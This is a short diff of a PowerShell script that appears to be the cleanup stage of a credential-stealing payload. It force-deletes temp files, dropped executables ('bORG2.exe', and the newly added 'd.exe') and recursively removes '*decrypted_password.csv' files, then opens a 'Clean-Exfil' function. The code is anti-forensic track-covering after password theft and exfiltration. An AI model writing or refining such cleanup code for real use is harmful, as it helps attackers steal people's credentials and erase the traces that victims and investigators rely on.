@@ -17,6 +17,7 @@ start-sleep 200
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 rm "$env:USERPROFILE\bORG2.exe"
+rm "$env:USERPROFILE\d.exe"
 get-childItem * -Include *decrypted_password.csv -Recurse | rm
 function Clean-Exfil { 
 
